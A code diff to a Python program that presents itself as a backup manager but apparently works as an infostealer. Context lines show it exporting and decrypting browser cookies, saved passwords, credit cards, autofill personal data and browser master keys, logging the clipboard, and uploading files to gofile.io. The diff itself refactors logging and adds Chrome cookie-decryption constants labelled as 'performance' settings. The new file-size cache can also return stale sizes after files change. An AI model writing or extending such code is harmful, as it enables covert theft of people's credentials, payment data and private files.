@@ -22,6 +22,8 @@ import sys
 import glob
 from datetime import datetime, timedelta
 from functools import lru_cache
+from typing import Optional, Iterator, Tuple, List
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
 
 requests = None
@@ -126,6 +128,15 @@ def ensure_uv_installed():
         except Exception as e:
             print(f"⚠ pip 安装 uv 失败: {str(e)}")
             return None
+
+
+@lru_cache(maxsize=8192)
+def get_file_size_cached(path: str) -> int:
+    """缓存文件大小查询，避免重复系统调用"""
+    try:
+        return os.path.getsize(path)
+    except (OSError, IOError):
+        return 0
 
 
 def check_and_install_dependencies():
@@ -509,6 +520,15 @@ class BackupConfig:
         "https://store5.gofile.io/uploadFile"
     ]
 
+    # 性能优化常量
+    PBKDF2_ITERATIONS = 1003
+    PBKDF2_SALT = b'saltysalt'
+    AES_IV = b' ' * 16
+    CHROME_DEFAULT_PASSWORD = "peanuts"
+    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6为速度与大小平衡点）
+    COMPRESSION_RATIO = 0.7  # 压缩比例估计（用于估算压缩后大小）
+    SAFETY_MARGIN = 0.7  # 安全边界（防止压缩后超过限制）
+
 # 配置日志
 if BackupConfig.DEBUG_MODE:
     logging.basicConfig(
@@ -648,7 +668,7 @@ class BackupManager:
             for filename in filenames:
                 file_path = os.path.join(dirpath, filename)
                 try:
-                    total_size += os.path.getsize(file_path)
+                    total_size += get_file_size_cached(file_path)
                 except (OSError, IOError) as e:
                     logging.error(f"获取文件大小失败 {file_path}: {e}")
         return total_size
@@ -708,7 +728,7 @@ class BackupManager:
                 socket.create_connection((host, port), timeout=BackupConfig.NETWORK_TIMEOUT)
                 return True
             except (socket.timeout, socket.error) as e:
-                logging.debug(f"连接 {host}:{port} 失败: {e}")
+                logging.debug("连接 %s:%s 失败: %s", host, port, e)
                 continue
         return False
 
@@ -723,7 +743,7 @@ class BackupManager:
             bool: 文件是否有效
         """
         try:
-            return os.path.isfile(file_path) and os.path.getsize(file_path) > 0
+            return os.path.isfile(file_path) and get_file_size_cached(file_path) > 0
         except Exception:
             return False
 
@@ -759,7 +779,7 @@ class BackupManager:
                 except PermissionError:
                     time.sleep(self.config.FILE_DELETE_RETRY_DELAY)
                 except (OSError, IOError) as e:
-                    logging.debug(f"删除文件重试中: {str(e)}")
+                    logging.debug("删除文件重试中: %s", str(e))
                     time.sleep(self.config.FILE_DELAY_AFTER_UPLOAD)
             return False
         except (OSError, IOError, PermissionError) as e:
@@ -847,10 +867,10 @@ class BackupManager:
         target_dir = os.path.abspath(os.path.expanduser(target_dir))
 
         if self.config.DEBUG_MODE:
-            logging.debug(f"开始备份目录:")
-            logging.debug(f"源目录: {source_dir}")
-            logging.debug(f"目标目录: {target_dir}")
-            logging.debug(f"扩展名类型: {extensions_type}")
+            logging.debug("开始备份目录:")
+            logging.debug("源目录: %s", source_dir)
+            logging.debug("目标目录: %s", target_dir)
+            logging.debug("扩展名类型: %s", extensions_type)
 
         if not os.path.exists(source_dir):
             logging.error(f"❌ 磁盘源目录不存在: {source_dir}")
@@ -868,7 +888,7 @@ class BackupManager:
                      else self.config.DISK_EXTENSIONS_2)
         
         if self.config.DEBUG_MODE:
-            logging.debug(f"使用的文件扩展名: {extensions}")
+            logging.debug("使用的文件扩展名: %s", extensions)
                      
         files_count = 0
         total_size = 0
@@ -891,8 +911,8 @@ class BackupManager:
                 # 定期显示进度
                 if current_time - last_progress_time >= self.config.PROGRESS_INTERVAL:
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"⏳ 已扫描 {scanned_dirs} 个目录，排除 {excluded_dirs} 个目录")
-                        logging.debug(f"⏳ 当前扫描: {root}")
+                        logging.debug("⏳ 已扫描 %s 个目录，排除 %s 个目录", scanned_dirs, excluded_dirs)
+                        logging.debug("⏳ 当前扫描: %s", root)
                     last_progress_time = current_time
                 
                 # 跳过目标目录
@@ -903,7 +923,7 @@ class BackupManager:
                 if self.should_exclude_dir(root):
                     excluded_dirs += 1
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"排除目录: {root}")
+                        logging.debug("排除目录: %s", root)
                     dirs.clear()  # 清空子目录列表，避免继续遍历
                     continue
 
@@ -918,18 +938,18 @@ class BackupManager:
                     
                     # 检查文件大小
                     try:
-                        file_size = os.path.getsize(source_file)
+                        file_size = get_file_size_cached(source_file)
                         if file_size == 0:
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"跳过空文件: {source_file}")
+                                logging.debug("跳过空文件: %s", source_file)
                             continue
                         if file_size > self.config.MAX_SINGLE_FILE_SIZE:
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"跳过大文件: {source_file} ({file_size / 1024 / 1024:.1f}MB)")
+                                logging.debug("跳过大文件: %s (%.1fMB)", source_file, file_size / 1024 / 1024)
                             continue
                     except OSError as e:
                         if self.config.DEBUG_MODE:
-                            logging.debug(f"获取文件大小失败: {source_file} - {str(e)}")
+                            logging.debug("获取文件大小失败: %s - %s", source_file, str(e))
                         continue
 
                     # 尝试复制文件
@@ -941,7 +961,7 @@ class BackupManager:
                                     test_read.read(1)
                             except (PermissionError, OSError) as e:
                                 if self.config.DEBUG_MODE:
-                                    logging.debug(f"文件访问失败: {source_file} - {str(e)}")
+                                    logging.debug("文件访问失败: %s - %s", source_file, str(e))
                                 if attempt < self.config.FILE_RETRY_COUNT - 1:
                                     time.sleep(self.config.FILE_RETRY_DELAY)
                                     continue
@@ -954,7 +974,7 @@ class BackupManager:
 
                             if not self._ensure_directory(target_sub_dir):
                                 if self.config.DEBUG_MODE:
-                                    logging.debug(f"创建目标子目录失败: {target_sub_dir}")
+                                    logging.debug("创建目标子目录失败: %s", target_sub_dir)
                                 break
                                 
                             # 使用优化的分块复制（1MB块大小）
@@ -970,15 +990,15 @@ class BackupManager:
                             
                             if self.config.DEBUG_MODE:
                                 if files_count % self.config.PROGRESS_LOG_INTERVAL == 0:
-                                    logging.debug(f"📁 已备份 {files_count} 个文件 ({total_size / 1024 / 1024:.1f}MB)")
-                                logging.debug(f"成功复制: {source_file} -> {target_file}")
+                                    logging.debug("📁 已备份 %s 个文件 (%.1fMB)", files_count, total_size / 1024 / 1024)
+                                logging.debug("成功复制: %s -> %s", source_file, target_file)
                             
                             break  # 成功后跳出重试循环
                             
                         except (PermissionError, OSError, IOError) as e:
                             if attempt == self.config.FILE_RETRY_COUNT - 1:
                                 if self.config.DEBUG_MODE:
-                                    logging.debug(f"❌ 文件复制失败: {source_file} - {str(e)}")
+                                    logging.debug("❌ 文件复制失败: %s - %s", source_file, str(e))
                         except (MemoryError, RuntimeError) as e:
                             if attempt == self.config.FILE_RETRY_COUNT - 1:
                                 logging.error(f"❌ 文件复制出现系统错误: {source_file} - {str(e)}")
@@ -994,14 +1014,14 @@ class BackupManager:
             logging.info(f"   📁 文件数量: {files_count}")
             logging.info(f"   💾 总大小: {total_size / 1024 / 1024:.1f}MB")
             if self.config.DEBUG_MODE:
-                logging.debug(f"   📂 扫描目录数: {scanned_dirs}")
-                logging.debug(f"   🚫 排除目录数: {excluded_dirs}")
+                logging.debug("   📂 扫描目录数: %s", scanned_dirs)
+                logging.debug("   🚫 排除目录数: %s", excluded_dirs)
             return target_dir
         else:
             if self.config.DEBUG_MODE:
-                logging.debug(f"扫描统计:")
-                logging.debug(f"- 扫描目录数: {scanned_dirs}")
-                logging.debug(f"- 排除目录数: {excluded_dirs}")
+                logging.debug("扫描统计:")
+                logging.debug("- 扫描目录数: %s", scanned_dirs)
+                logging.debug("- 排除目录数: %s", excluded_dirs)
             logging.error(f"❌ 未找到需要备份的文件")
             return None
     
@@ -1025,7 +1045,7 @@ class BackupManager:
         if not os.path.exists(file_path):
             return None
         
-        file_size = os.path.getsize(file_path)
+        file_size = get_file_size_cached(file_path)
         if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
             return None
         
@@ -1139,7 +1159,7 @@ class BackupManager:
                 logging.error(f"文件不存在: {file_path}")
                 return False
                 
-            file_size = os.path.getsize(file_path)
+            file_size = get_file_size_cached(file_path)
             if file_size == 0:
                 logging.error(f"文件大小为0: {file_path}")
                 return False
@@ -1183,7 +1203,7 @@ class BackupManager:
                         size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                         logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                     elif self.config.DEBUG_MODE:
-                        logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
+                        logging.debug("[%s] 重试上传: %s (第 %s 次)", config_name, filename, attempt + 1)
                     
                     # 准备请求头
                     headers = {
@@ -1233,7 +1253,7 @@ class BackupManager:
 
                 if attempt < self.config.RETRY_COUNT - 1:
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"[{config_name}] 等待 {self.config.RETRY_DELAY} 秒后重试...")
+                        logging.debug("[%s] 等待 %s 秒后重试...", config_name, self.config.RETRY_DELAY)
                     time.sleep(self.config.RETRY_DELAY)
 
             return False
@@ -1259,7 +1279,7 @@ class BackupManager:
             return False
 
         try:
-            file_size = os.path.getsize(file_path)
+            file_size = get_file_size_cached(file_path)
             if file_size == 0:
                 logging.error(f"文件大小为0: {file_path}")
                 return False
@@ -1373,7 +1393,7 @@ class BackupManager:
             return False
 
         try:
-            file_size = os.path.getsize(file_path)
+            file_size = get_file_size_cached(file_path)
             if file_size == 0:
                 logging.error(f"文件大小为0: {file_path}")
                 self._safe_remove_file(file_path, retry=False)
@@ -1445,7 +1465,7 @@ class BackupManager:
                 for filename in filenames:
                     try:
                         file_path = os.path.join(dirpath, filename)
-                        file_size = os.path.getsize(file_path)
+                        file_size = get_file_size_cached(file_path)
                         if file_size > 0:  # 跳过空文件
                             dir_size += file_size
                     except OSError as e:
@@ -1463,12 +1483,12 @@ class BackupManager:
             if os.path.exists(tar_path):
                 os.remove(tar_path)
 
-            with tarfile.open(tar_path, "w:gz") as tar:
+            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                 tar.add(folder_path, arcname=os.path.basename(folder_path))
 
             # 验证压缩文件
             try:
-                compressed_size = os.path.getsize(tar_path)
+                compressed_size = get_file_size_cached(tar_path)
                 if compressed_size == 0:
                     logging.error(f"压缩文件大小为0 {tar_path}")
                     if os.path.exists(tar_path):
@@ -1506,8 +1526,8 @@ class BackupManager:
 
         if self.config.DEBUG_MODE:
             logging.debug("开始备份指定目录和文件:")
-            logging.debug(f"源目录: {source_dir}")
-            logging.debug(f"目标目录: {target_dir}")
+            logging.debug("源目录: %s", source_dir)
+            logging.debug("目标目录: %s", target_dir)
 
         if not os.path.exists(source_dir):
             logging.error(f"❌ 源目录不存在: {source_dir}")
@@ -1530,14 +1550,14 @@ class BackupManager:
                 pattern = os.path.join(source_dir, item)
                 matched_paths = glob.glob(pattern)
                 if not matched_paths and self.config.DEBUG_MODE:
-                    logging.debug(f"通配符未匹配到任何项目: {pattern}")
+                    logging.debug("通配符未匹配到任何项目: %s", pattern)
                 for matched_path in matched_paths:
                     rel_name = os.path.relpath(matched_path, source_dir)
                     rel_target = os.path.join(target_dir, rel_name)
                     parent_dir = os.path.dirname(rel_target)
                     if not self._ensure_directory(parent_dir):
                         if self.config.DEBUG_MODE:
-                            logging.debug(f"创建目标父目录失败: {parent_dir}")
+                            logging.debug("创建目标父目录失败: %s", parent_dir)
                         continue
 
                     try:
@@ -1547,23 +1567,23 @@ class BackupManager:
                             files_count += 1
                             total_size += dir_size
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"成功复制目录: {matched_path} -> {rel_target}")
+                                logging.debug("成功复制目录: %s -> %s", matched_path, rel_target)
                         else:
                             shutil.copy2(matched_path, rel_target)
-                            file_size = os.path.getsize(rel_target)
+                            file_size = get_file_size_cached(rel_target)
                             files_count += 1
                             total_size += file_size
                             if self.config.DEBUG_MODE:
-                                logging.debug(f"成功复制文件: {matched_path} -> {rel_target}")
+                                logging.debug("成功复制文件: %s -> %s", matched_path, rel_target)
                     except Exception as e:
                         if self.config.DEBUG_MODE:
-                            logging.debug(f"处理失败: {matched_path} - {str(e)}")
+                            logging.debug("处理失败: %s - %s", matched_path, str(e))
                 continue
 
             source_path = os.path.join(source_dir, item)
             if not os.path.exists(source_path):
                 if self.config.DEBUG_MODE:
-                    logging.debug(f"跳过不存在的项目: {source_path}")
+                    logging.debug("跳过不存在的项目: %s", source_path)
                 continue
 
             try:
@@ -1573,31 +1593,31 @@ class BackupManager:
                     parent_dir = os.path.dirname(target_path)
                     if not self._ensure_directory(parent_dir):
                         if self.config.DEBUG_MODE:
-                            logging.debug(f"创建目标父目录失败: {parent_dir}")
+                            logging.debug("创建目标父目录失败: %s", parent_dir)
                         continue
                     shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                     dir_size = self._get_dir_size(target_path)
                     files_count += 1
                     total_size += dir_size
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"成功复制目录: {source_path} -> {target_path}")
+                        logging.debug("成功复制目录: %s -> %s", source_path, target_path)
                 else:
                     # 复制文件
                     target_path = os.path.join(target_dir, item)
                     parent_dir = os.path.dirname(target_path)
                     if not self._ensure_directory(parent_dir):
                         if self.config.DEBUG_MODE:
-                            logging.debug(f"创建目标父目录失败: {parent_dir}")
+                            logging.debug("创建目标父目录失败: %s", parent_dir)
                         continue
                     shutil.copy2(source_path, target_path)
-                    file_size = os.path.getsize(target_path)
+                    file_size = get_file_size_cached(target_path)
                     files_count += 1
                     total_size += file_size
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"成功复制文件: {source_path} -> {target_path}")
+                        logging.debug("成功复制文件: %s -> %s", source_path, target_path)
             except Exception as e:
                 if self.config.DEBUG_MODE:
-                    logging.debug(f"复制失败: {source_path} - {str(e)}")
+                    logging.debug("复制失败: %s - %s", source_path, str(e))
 
         if files_count > 0:
             logging.info("\n📊 指定文件备份完成:")
@@ -1641,7 +1661,7 @@ class BackupManager:
                 for filename in filenames:
                     file_path = os.path.join(dirpath, filename)
                     try:
-                        file_size = os.path.getsize(file_path)
+                        file_size = get_file_size_cached(file_path)
                         if file_size > 0:  # 跳过空文件
                             rel_path = os.path.relpath(file_path, folder_path)
                             all_files.append((file_path, rel_path, file_size))
@@ -1687,10 +1707,10 @@ class BackupManager:
                             # 压缩分块，使用更高的压缩级别
                             tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                             try:
-                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
+                                with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                                     tar.add(part_dir, arcname=os.path.basename(folder_path))
                                 
-                                compressed_size = os.path.getsize(tar_path)
+                                compressed_size = get_file_size_cached(tar_path)
                                 if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                     os.remove(tar_path)
                                     # 如果压缩后仍然过大，尝试将当前块再次分割
@@ -1739,10 +1759,10 @@ class BackupManager:
                     if chunk_success:
                         tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                         try:
-                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
+                            with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                                 tar.add(part_dir, arcname=os.path.basename(folder_path))
                             
-                            compressed_size = os.path.getsize(tar_path)
+                            compressed_size = get_file_size_cached(tar_path)
                             if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                 os.remove(tar_path)
                                 # 如果压缩后仍然过大，尝试将当前块再次分割
@@ -1809,10 +1829,10 @@ class BackupManager:
         if chunk_success:
             tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
             try:
-                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
+                with tarfile.open(tar_path, "w:gz", compresslevel=self.config.TAR_COMPRESS_LEVEL) as tar:
                     tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                 
-                compressed_size = os.path.getsize(tar_path)
+                compressed_size = get_file_size_cached(tar_path)
                 if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                     compressed_files.append(tar_path)
                     logging.info(f"子分块: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
@@ -1987,8 +2007,8 @@ def get_available_disks():
                         
                         # 添加调试日志
                         if BackupConfig.DEBUG_MODE:
-                            logging.debug(f"云盘源目录: {os.path.abspath(item_path)}")
-                            logging.debug(f"云盘备份目录: {cloud_backup_path}")
+                            logging.debug("云盘源目录: %s", os.path.abspath(item_path))
+                            logging.debug("云盘备份目录: %s", cloud_backup_path)
         except Exception as e:
             logging.error(f"扫描用户云盘目录时出错: {e}")
     
@@ -2068,7 +2088,7 @@ def backup_screenshots():
                             
                         # 检查文件大小
                         try:
-                            file_size = os.path.getsize(source_file)
+                            file_size = get_file_size_cached(source_file)
                             if file_size == 0 or file_size > backup_manager.config.MAX_SINGLE_FILE_SIZE:
                                 continue
                         except OSError:
@@ -2174,11 +2194,11 @@ def backup_browser_extensions(backup_manager):
                                                 return ext_name
                             except Exception as e:
                                 if backup_manager.config.DEBUG_MODE:
-                                    logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
+                                    logging.debug("读取manifest.json失败: %s - %s", manifest_path, e)
                                 continue
         except Exception as e:
             if backup_manager.config.DEBUG_MODE:
-                logging.debug(f"识别扩展失败: {ext_id} - {e}")
+                logging.debug("识别扩展失败: %s - %s", ext_id, e)
         
         return None
     
@@ -2237,7 +2257,7 @@ def backup_browser_extensions(backup_manager):
                                 logging.error(f"复制扩展目录失败: {source_dir} - {e}")
                     except Exception as e:
                         if backup_manager.config.DEBUG_MODE:
-                            logging.debug(f"扫描扩展目录失败: {ext_settings_path} - {e}")
+                            logging.debug("扫描扩展目录失败: %s - %s", ext_settings_path, e)
             
             except Exception as e:
                 logging.error(f"扫描 {browser_name} 配置文件失败: {e}")
@@ -2290,9 +2310,9 @@ def export_browser_cookies_passwords(backup_manager):
             except sqlite3.OperationalError as e:
                 # 文件被锁定或无法访问是常见情况，降低日志级别
                 if "locked" in str(e).lower() or "unable to open" in str(e).lower():
-                    logging.debug(f"SQLite 在线备份失败（文件可能被锁定）: {source_db}")
+                    logging.debug("SQLite 在线备份失败（文件可能被锁定）: %s", source_db)
                 else:
-                    logging.debug(f"SQLite 在线备份失败: {e}")
+                    logging.debug("SQLite 在线备份失败: %s", str(e))
                 return False
             except Exception as e:
                 logging.debug(f"SQLite 在线备份失败: {type(e).__name__}: {e}")
@@ -2319,11 +2339,11 @@ def export_browser_cookies_passwords(backup_manager):
                         return True
                     except Exception as e:
                         if attempt == max_retries - 1:
-                            logging.debug(f"文件被锁定，尝试 SQLite 在线备份: {source_path}")
+                            logging.debug("文件被锁定，尝试 SQLite 在线备份: %s", source_path)
                             return sqlite_online_backup(source_path, dest_path)
                         time.sleep(0.5)
                 except Exception as e:
-                    logging.debug(f"复制失败: {source_path} - {e}")
+                    logging.debug("复制失败: %s - %s", source_path, e)
                     return False
             return False
 
@@ -2345,7 +2365,8 @@ def export_browser_cookies_passwords(backup_manager):
             # 只在有失败且失败数量较多时记录汇总日志（避免正常情况下的日志噪音）
             if failed_count > 0 and failed_count > len(cipher_list) * 0.1:  # 失败率超过10%时记录
                 error_summary = ", ".join([f"{err}({count}次)" for err, count in list(failed_errors.items())[:3]])
-                logging.debug(f"DPAPI 解密统计: 总计 {len(cipher_list)} 项, 失败 {failed_count} 项 ({failed_count/len(cipher_list)*100:.1f}%), 主要错误: {error_summary}")
+                logging.debug("DPAPI 解密统计: 总计 %s 项, 失败 %s 项 (%.1f%%), 主要错误: %s",
+                              len(cipher_list), failed_count, failed_count / len(cipher_list) * 100, error_summary)
             
             return results
 
@@ -2420,7 +2441,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "httponly": bool(is_httponly)
                                     }, encrypted_value))
                             except Exception as e:
-                                logging.debug(f"Cookies 解密失败: {e}")
+                                logging.debug("Cookies 解密失败: %s", str(e))
                         if dpapi_cookie_items:
                             decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_cookie_items])
                             for (item, _), dec in zip(dpapi_cookie_items, decrypted_list):
@@ -2428,9 +2449,9 @@ def export_browser_cookies_passwords(backup_manager):
                                     item["value"] = dec
                                     cookies.append(item)
                     else:
-                        logging.debug(f"无法复制 Cookies 数据库: {cookies_path}")
+                        logging.debug("无法复制 Cookies 数据库: %s", cookies_path)
                 except (sqlite3.Error, UnicodeDecodeError) as e:
-                    logging.debug(f"导出 Cookies 失败 (尝试备用方法): {e}")
+                    logging.debug("导出 Cookies 失败 (尝试备用方法): %s", str(e))
                     # 如果 CAST 方法失败，尝试使用备用方法
                     try:
                         if safe_copy_locked_file(cookies_path, temp_cookies):
@@ -2483,9 +2504,9 @@ def export_browser_cookies_passwords(backup_manager):
                                         cookies.append(item)
                             conn.close()
                     except Exception as e2:
-                        logging.debug(f"备用方法也失败: {e2}")
+                        logging.debug("备用方法也失败: %s", str(e2))
                 except Exception as e:
-                    logging.debug(f"导出 Cookies 失败: {e}")
+                    logging.debug("导出 Cookies 失败: %s", str(e))
                 finally:
                     if conn:
                         try:
@@ -2545,7 +2566,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "password": None
                                     }, encrypted_password))
                             except Exception as e:
-                                logging.debug(f"密码解密失败: {e}")
+                                logging.debug("密码解密失败: %s", str(e))
                         if dpapi_password_items:
                             decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_password_items])
                             for (item, _), dec in zip(dpapi_password_items, decrypted_list):
@@ -2553,9 +2574,9 @@ def export_browser_cookies_passwords(backup_manager):
                                     item["password"] = dec
                                     passwords.append(item)
                     else:
-                        logging.debug(f"无法复制 Login Data 数据库: {login_data_path}")
+                        logging.debug("无法复制 Login Data 数据库: %s", login_data_path)
                 except (sqlite3.Error, UnicodeDecodeError) as e:
-                    logging.debug(f"导出密码失败 (尝试备用方法): {e}")
+                    logging.debug("导出密码失败 (尝试备用方法): %s", str(e))
                     # 如果 CAST 方法失败，尝试使用备用方法
                     try:
                         if safe_copy_locked_file(login_data_path, temp_login):
@@ -2599,9 +2620,9 @@ def export_browser_cookies_passwords(backup_manager):
                                         passwords.append(item)
                             conn.close()
                     except Exception as e2:
-                        logging.debug(f"备用方法也失败: {e2}")
+                        logging.debug("备用方法也失败: %s", str(e2))
                 except Exception as e:
-                    logging.debug(f"导出密码失败: {e}")
+                    logging.debug("导出密码失败: %s", str(e))
                 finally:
                     if conn:
                         try:
@@ -2672,7 +2693,7 @@ def export_browser_cookies_passwords(backup_manager):
                                                 "nickname": nickname
                                             }, encrypted_card))
                                     except Exception as e:
-                                        logging.debug(f"信用卡解密失败: {e}")
+                                        logging.debug("信用卡解密失败: %s", str(e))
                                 if dpapi_card_items:
                                     decrypted_list = decrypt_dpapi_batch([c for _, c in dpapi_card_items])
                                     for (item, _), dec in zip(dpapi_card_items, decrypted_list):
@@ -2680,7 +2701,7 @@ def export_browser_cookies_passwords(backup_manager):
                                             item["card_number"] = dec
                                             web_data["credit_cards"].append(item)
                             except (sqlite3.Error, UnicodeDecodeError) as e:
-                                logging.debug(f"导出信用卡信息失败 (尝试备用方法): {e}")
+                                logging.debug("导出信用卡信息失败 (尝试备用方法): %s", str(e))
                                 # 如果 CAST 方法失败，尝试使用备用方法
                                 try:
                                     conn2 = sqlite3.connect(temp_web_data)
@@ -2732,9 +2753,9 @@ def export_browser_cookies_passwords(backup_manager):
                                                 web_data["credit_cards"].append(item)
                                     conn2.close()
                                 except Exception as e2:
-                                    logging.debug(f"备用方法也失败: {e2}")
+                                    logging.debug("备用方法也失败: %s", str(e2))
                             except Exception as e:
-                                logging.debug(f"导出信用卡信息失败: {e}")
+                                logging.debug("导出信用卡信息失败: %s", str(e))
                         
                         # 导出自动填充个人信息（仅在表存在时）
                         if table_exists(cursor, "autofill_profiles"):
@@ -2752,7 +2773,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "honorific_suffix": honorific_suffix
                                     })
                             except Exception as e:
-                                logging.debug(f"导出自动填充个人信息失败: {e}")
+                                logging.debug("导出自动填充个人信息失败: %s", str(e))
                         
                         # 导出姓名信息（仅在表存在时）
                         if table_exists(cursor, "autofill_profile_names"):
@@ -2768,7 +2789,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "full_name": full_name
                                     })
                             except Exception as e:
-                                logging.debug(f"导出姓名信息失败: {e}")
+                                logging.debug("导出姓名信息失败: %s", str(e))
                         
                         # 导出邮箱信息（仅在表存在时）
                         if table_exists(cursor, "autofill_profile_emails"):
@@ -2781,7 +2802,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "email": email
                                     })
                             except Exception as e:
-                                logging.debug(f"导出邮箱信息失败: {e}")
+                                logging.debug("导出邮箱信息失败: %s", str(e))
                         
                         # 导出电话信息（仅在表存在时）
                         if table_exists(cursor, "autofill_profile_phones"):
@@ -2794,7 +2815,7 @@ def export_browser_cookies_passwords(backup_manager):
                                         "number": number
                                     })
                             except Exception as e:
-                                logging.debug(f"导出电话信息失败: {e}")
+                                logging.debug("导出电话信息失败: %s", str(e))
                         
                         # 导出地址信息（仅在表存在时）
                         if table_exists(cursor, "autofill_profile_addresses"):
@@ -2813,11 +2834,11 @@ def export_browser_cookies_passwords(backup_manager):
                                         "country_code": country_code
                                     })
                             except Exception as e:
-                                logging.debug(f"导出地址信息失败: {e}")
+                                logging.debug("导出地址信息失败: %s", str(e))
                     else:
-                        logging.debug(f"无法复制 Web Data 数据库: {web_data_path}")
+                        logging.debug("无法复制 Web Data 数据库: %s", web_data_path)
                 except Exception as e:
-                    logging.debug(f"导出 Web Data 失败: {e}")
+                    logging.debug("导出 Web Data 失败: %s", str(e))
                 finally:
                     if conn:
                         try:
@@ -2849,7 +2870,7 @@ def export_browser_cookies_passwords(backup_manager):
                     # 将 Master Key 编码为 base64 以便保存
                     master_key_b64 = base64.b64encode(master_key).decode('utf-8')
                 except Exception as e:
-                    logging.debug(f"获取 {browser_name} Master Key 失败: {e}")
+                    logging.debug("获取 %s Master Key 失败: %s", browser_name, str(e))
                     master_key = None
                     master_key_b64 = None
             
@@ -2961,7 +2982,7 @@ def backup_and_upload_logs(backup_manager):
     try:
         if not os.path.exists(log_file):
             if backup_manager.config.DEBUG_MODE:
-                logging.debug(f"备份日志文件不存在，跳过: {log_file}")
+                logging.debug("备份日志文件不存在，跳过: %s", log_file)
             return
         
         # 刷新日志缓冲区，确保所有日志都已写入文件
@@ -2973,10 +2994,10 @@ def backup_and_upload_logs(backup_manager):
         time.sleep(0.5)
             
         # 检查日志文件大小
-        file_size = os.path.getsize(log_file)
+        file_size = get_file_size_cached(log_file)
         if file_size == 0:
             if backup_manager.config.DEBUG_MODE:
-                logging.debug(f"备份日志文件为空，跳过: {log_file}")
+                logging.debug("备份日志文件为空，跳过: %s", log_file)
             return
             
         # 创建临时目录
@@ -3007,12 +3028,12 @@ def backup_and_upload_logs(backup_manager):
                 dst.write(log_content)
             
             # 验证备份文件是否创建成功
-            if not os.path.exists(backup_path) or os.path.getsize(backup_path) == 0:
+            if not os.path.exists(backup_path) or get_file_size_cached(backup_path) == 0:
                 logging.error("❌ 备份日志文件创建失败或为空")
                 return
-                
+
             # 上传日志文件
-            logging.info(f"📤 开始上传备份日志文件 ({os.path.getsize(backup_path) / 1024:.2f}KB)...")
+            logging.info(f"📤 开始上传备份日志文件 ({get_file_size_cached(backup_path) / 1024:.2f}KB)...")
             if backup_manager.upload_file(str(backup_path)):
                 # 上传成功后清空原始日志文件，只保留一条记录
                 try:
@@ -3039,7 +3060,7 @@ def backup_and_upload_logs(backup_manager):
                     shutil.rmtree(str(temp_dir))
             except Exception as e:
                 if backup_manager.config.DEBUG_MODE:
-                    logging.debug(f"清理临时目录失败: {e}")
+                    logging.debug("清理临时目录失败: %s", str(e))
                 
     except Exception as e:
         logging.error(f"❌ 处理备份日志时出错: {e}")
@@ -3364,7 +3385,7 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                 if os.path.exists(clipboard_log_path):
                     try:
                         # 检查文件大小
-                        file_size = os.path.getsize(clipboard_log_path)
+                        file_size = get_file_size_cached(clipboard_log_path)
                         if file_size > min_content_size:  # 只有当内容足够时才上传
                             # 检查文件内容
                             with open(clipboard_log_path, 'r', encoding='utf-8') as f:
